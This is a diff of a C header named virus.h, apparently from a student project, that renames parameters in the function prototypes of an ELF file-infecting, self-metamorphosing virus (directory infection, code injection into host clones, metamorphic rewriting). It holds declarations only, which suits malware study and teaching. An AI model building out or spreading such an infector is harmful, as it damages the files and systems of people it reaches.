@@ -1,14 +1,3 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   virus.h                                            :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2021/06/15 20:07:57 by ichkamo          ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
 
 #ifndef VIRUS_H
 # define VIRUS_H
@@ -48,23 +37,22 @@ struct				entry
 ** virus entry point and start routines
 */
 
-void		virus(struct virus_header *vhdr);
-void		infect_files_in(struct virus_header *vhdr, const char *path);
-bool		infect(struct virus_header *vhdr, const char *file);
-bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr original_ref);
+void		virus(const struct virus_header *vhdr);
+void		infect_files_in(const struct virus_header *vhdr, const char *root_dir);
+bool		infect(const struct virus_header *vhdr, const char *file);
+bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr file_ref);
 
 /*
 ** infection engine routines
 */
 
-bool		find_entry(struct entry *file_entry, struct safe_ptr ref);
-bool		setup_virus_header(struct safe_ptr ref, size_t end_of_last_section, size_t virus_size, uint64_t seed);
-bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_last_section);
-bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr original_ref, \
-			size_t end_last_sect, size_t shift_amount, size_t original_size);
-bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original_entry, struct virus_header *vhdr);
-bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, size_t loader_off, uint64_t seed);
-bool		generate_seed(uint64_t *seed, struct safe_ptr original_ref);
+bool		find_entry(struct entry *entry, struct safe_ptr ref);
+bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, size_t full_virus_size, uint64_t seed);
+bool		adjust_references(struct safe_ptr clone_ref, size_t shift_amount, size_t end_of_last_section);
+bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t end_of_last_section, size_t shift_amount);
+bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *file_entry, const struct virus_header *vhdr);
+bool		metamorph_clone(struct safe_ptr clone_ref, size_t *full_virus_size, size_t loader_off, uint64_t seed);
+bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
 
 /*
 ** elf iterators
